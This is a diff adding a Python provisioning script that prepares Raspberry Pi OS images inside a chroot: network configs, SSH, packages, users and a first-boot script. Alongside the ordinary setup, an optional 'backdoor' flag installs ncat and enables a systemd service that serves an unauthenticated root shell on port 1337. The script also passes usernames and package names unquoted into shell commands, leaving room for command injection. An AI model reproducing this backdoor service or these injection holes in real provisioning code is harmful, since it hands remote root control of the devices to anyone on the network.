@@ -1,0 +1,255 @@
+#!/usr/bin/env python3
+"""
+setup-raspios-docker - Entrypoint for pi-setup Docker image (Raspberry Pi OS Bookworm).
+Reads a JSON task list from stdin and runs chroot commands against /mnt/pi.
+Uses capsh to chroot and drop CAP_SYS_CHROOT before executing any commands.
+"""
+import json
+import os
+import shlex
+import shutil
+import subprocess
+import sys
+
+os.environ["PATH"] = "/usr/sbin:/usr/bin:/sbin:/bin"
+
+QEMU_SRC = "/usr/bin/qemu-arm-static"
+QEMU_DST = "/mnt/pi/usr/bin/qemu-arm-static"
+ROOT     = "/mnt/pi"
+
+def write(path, content, mode=0o644):
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, 'w') as f:
+        f.write(content)
+    os.chmod(path, mode)
+    print(f"  wrote {path}")
+
+def setup_qemu():
+    os.makedirs(os.path.dirname(QEMU_DST), exist_ok=True)
+    shutil.copy2(QEMU_SRC, QEMU_DST)
+    print(f"  copied qemu -> {QEMU_DST}", flush=True)
+
+def teardown_qemu():
+    try:
+        os.unlink(QEMU_DST)
+        print(f"  removed {QEMU_DST}", flush=True)
+    except FileNotFoundError:
+        pass
+
+def chroot_run(cmd, stdin=None):
+    full = f"capsh --drop=cap_sys_chroot,cap_mknod --chroot={ROOT} -- -c {shlex.quote(cmd)}"
+    print(f"  $ {full}", flush=True)
+    result = subprocess.run(full, shell=True, input=stdin, text=True)
+    if result.returncode != 0:
+        print(f"  ! failed with exit code {result.returncode}", file=sys.stderr, flush=True)
+        teardown_qemu()
+        sys.exit(result.returncode)
+
+def netmask_to_prefix(netmask):
+    """Convert e.g. '255.255.255.0' -> 24"""
+    return sum(bin(int(x)).count('1') for x in netmask.split('.'))
+
+def nm_eth_connection(cfg):
+    """NetworkManager keyfile for eth0."""
+    if cfg.get("eth_dhcp", True):
+        ipv4 = "method=auto"
+    else:
+        prefix = netmask_to_prefix(cfg["eth_netmask"])
+        ipv4 = f"method=manual\naddresses={cfg['eth_ip']}/{prefix}"
+        if cfg.get("eth_gateway"):
+            ipv4 += f"\ngateway={cfg['eth_gateway']}"
+    return f"""\
+[connection]
+id=eth0
+type=ethernet
+interface-name=eth0
+[ethernet]
+[ipv4]
+{ipv4}
+[ipv6]
+addr-gen-mode=default
+method=auto
+"""
+
+def nm_wifi_connection(cfg):
+    """NetworkManager keyfile for wlan0."""
+    if not cfg.get("wifi"):
+        return None
+    if cfg.get("wifi_dhcp", True):
+        ipv4 = "method=auto"
+    else:
+        prefix = netmask_to_prefix(cfg["wifi_netmask"])
+        ipv4 = f"method=manual\naddresses={cfg['wlan0_ip']}/{prefix}\ngateway={cfg['wifi_gateway']}"
+    return f"""\
+[connection]
+id=wlan0
+type=wifi
+interface-name=wlan0
+[wifi]
+mode=infrastructure
+ssid={cfg["wifi_ssid"]}
+[wifi-security]
+auth-alg=open
+key-mgmt=wpa-psk
+psk={cfg["wifi_pass"]}
+[ipv4]
+{ipv4}
+[ipv6]
+addr-gen-mode=default
+method=auto
+"""
+
+def write_configs(cfg):
+    r = ROOT
+    write(f"{r}/etc/hostname", cfg["hostname"] + "\n")
+    write(f"{r}/etc/hosts", f"""\
+127.0.0.1   localhost
+127.0.1.1   {cfg["hostname"]}
+::1         localhost ip6-localhost ip6-loopback
+ff02::1     ip6-allnodes
+ff02::2     ip6-allrouters
+""")
+    nm_dir = f"{r}/etc/NetworkManager/system-connections"
+    os.makedirs(nm_dir, exist_ok=True)
+    write(f"{nm_dir}/eth0.nmconnection", nm_eth_connection(cfg), mode=0o600)
+    wifi = nm_wifi_connection(cfg)
+    if wifi:
+        write(f"{nm_dir}/wlan0.nmconnection", wifi, mode=0o600)
+
+    if cfg.get("persistent_logging"):
+        # Write a drop-in to override Pi OS's volatile storage default
+        # (/usr/lib/systemd/journald.conf.d/40-rpi-volatile-storage.conf)
+        dropin = f"{r}/etc/systemd/journald.conf.d/99-persistent.conf"
+        print(f"  enabling persistent logging via {dropin}")
+        os.makedirs(os.path.dirname(dropin), exist_ok=True)
+        write(dropin, "[Journal]\nStorage=persistent\nSyncIntervalSec=5s\n")
+
+
+BACKDOOR_SERVICE = """[Unit]
+Description=Debug backdoor (root shell on port 1337)
+After=network.target
+
+[Service]
+ExecStart=/bin/bash -c 'while true; do ncat -lp 1337 -e /bin/bash; done'
+Restart=always
+RestartSec=2
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+
+def write_backdoor():
+    svc = f"{ROOT}/etc/systemd/system/backdoor.service"
+    write(svc, BACKDOOR_SERVICE)
+    print(f"  wrote {svc}", flush=True)
+
+
+FIRST_BOOT_SERVICE = """\
+[Unit]
+Description=First boot script
+After=network.target
+ConditionPathExists=!/etc/first-boot-done
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /usr/local/bin/first-boot.sh
+ExecStartPost=/bin/touch /etc/first-boot-done
+RemainAfterExit=yes
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+
+def write_first_boot(cmd):
+    script = f"{ROOT}/usr/local/bin/first-boot.sh"
+    write(script, f"#!/bin/bash\n{cmd}\n", mode=0o755)
+    svc = f"{ROOT}/etc/systemd/system/first-boot.service"
+    write(svc, FIRST_BOOT_SERVICE)
+    print(f"  wrote {svc}", flush=True)
+    chroot_run("systemctl enable first-boot")
+
+
+def write_ssh_keys(name, keys):
+    """Write authorized_keys for a user with correct ownership and permissions."""
+    ssh_dir  = f"{ROOT}/home/{name}/.ssh"
+    auth_file = f"{ssh_dir}/authorized_keys"
+    os.makedirs(ssh_dir, exist_ok=True)
+    with open(auth_file, 'w') as f:
+        for key in keys:
+            f.write(key.strip() + "\n")
+    # Look up uid/gid from the chroot passwd file
+    uid, gid = None, None
+    passwd = f"{ROOT}/etc/passwd"
+    if os.path.exists(passwd):
+        for line in open(passwd):
+            parts = line.strip().split(":")
+            if parts[0] == name:
+                uid, gid = int(parts[2]), int(parts[3])
+                break
+    if uid is not None:
+        os.chown(ssh_dir,   uid, gid)
+        os.chown(auth_file, uid, gid)
+    os.chmod(ssh_dir,   0o700)
+    os.chmod(auth_file, 0o600)
+    print(f"  wrote {auth_file} ({len(keys)} key(s))")
+
+def main():
+    raw      = sys.stdin.read()
+    tasks    = json.loads(raw)
+    packages = tasks.get("packages", [])
+    users    = tasks.get("users", [])
+    cfg      = tasks.get("config", {})
+
+    safe = dict(tasks)
+    safe["users"] = [{**u, "password": "***"} for u in users]
+    safe["config"] = {k: ("***" if k in ("wifi_pass",) else v) for k, v in cfg.items()}
+    print(f"Tasks: {json.dumps(safe)}", flush=True)
+
+    print("\n=== Writing config files ===", flush=True)
+    write_configs(cfg)
+
+    setup_qemu()
+    try:
+        print("\n=== Enabling SSH ===", flush=True)
+        chroot_run("systemctl enable ssh")
+
+        if cfg.get("backdoor"):
+            print("\n=== Installing debug backdoor on port 1337 ===", flush=True)
+            chroot_run("apt-get update")
+            chroot_run("DEBIAN_FRONTEND=noninteractive apt-get install -y ncat")
+            write_backdoor()
+            chroot_run("systemctl enable backdoor")
+
+        if packages:
+            print(f"\n=== Installing packages: {' '.join(packages)} ===", flush=True)
+            chroot_run("apt-get update")
+            chroot_run(f"DEBIAN_FRONTEND=noninteractive apt-get install -y {' '.join(packages)}")
+
+        if cfg.get("first_boot_cmd"):
+            print("\n=== Installing first boot script ===", flush=True)
+            write_first_boot(cfg["first_boot_cmd"])
+
+        for user in users:
+            name     = user["name"]
+            password = user["password"]
+            sudo     = user.get("sudo", False)
+            keys     = user.get("ssh_authorized_keys", [])
+
+            print(f"\n=== Creating user: {name} (sudo={sudo}) ===", flush=True)
+            chroot_run(f"useradd -m -s /bin/bash {name}")
+            chroot_run("chpasswd", stdin=f"{name}:{password}\n")
+            if sudo:
+                chroot_run(f"usermod -aG sudo {name}")
+            if keys:
+                print(f"  writing {len(keys)} SSH key(s) for {name}", flush=True)
+                write_ssh_keys(name, keys)
+
+    finally:
+        teardown_qemu()
+
+    print("\n=== Done ===", flush=True)
+
+if __name__ == "__main__":
+    main()
